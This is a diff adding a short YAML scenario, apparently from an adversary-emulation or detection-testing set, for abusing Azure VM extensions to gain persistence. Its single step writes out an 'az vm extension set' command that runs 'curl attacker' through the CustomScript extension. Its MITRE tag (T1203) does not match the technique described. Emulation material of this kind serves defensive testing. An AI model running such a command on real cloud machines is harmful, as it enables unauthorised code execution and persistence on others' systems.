@@ -1,0 +1,7 @@
+name: Virtual Machine Extension Abuse
+description: Virtual Machine Extension Abuse
+mitre_technique: T1203
+stage: Persistence
+steps:
+- action: az vm extension set --publisher Microsoft.Azure.Extensions --name CustomScript --settings '{"commandToExecute":"curl attacker"}'
+  description: Set persistence via VM extension
